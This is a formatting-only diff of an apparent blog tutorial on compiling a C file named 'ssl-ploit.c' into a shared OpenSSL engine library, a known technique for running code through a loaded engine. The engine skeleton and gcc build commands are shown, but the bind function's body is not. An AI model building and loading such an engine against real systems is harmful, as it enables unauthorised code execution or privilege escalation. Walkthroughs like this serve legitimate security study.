@@ -17,7 +17,7 @@ published: true
 >`sudo apt-get install libssl-dev`  
 >>### Time to craft the exploit:
 >>Create a file named `ssl-ploit.c`, or whatever you like XD. Write the following into the file. 👻
->> ``` 
+>> ```c 
 >> #include <openssl/engine.h>
 >>
 >>static int bind(ENGINE *e, const char *id)
@@ -29,11 +29,14 @@ published: true
 >>IMPLEMENT_DYNAMIC_BIND_FN(bind)
 >>IMPLEMENT_DYNAMIC_CHECK_FN()
 >> ```
-
+>>
 >>### Compilattion: 
->>run the following commands
->>1.`gcc -fPIC -o ssl-ploit.o -c ssl-ploit.c`
+>>run the following commands:  
+>>1.`gcc -fPIC -o ssl-ploit.o -c ssl-ploit.c`  
 >>2.`gcc -shared -o ssl-ploit-so -lcrypt ssl-ploit.o`  
+>>  
+
+
 
 
 
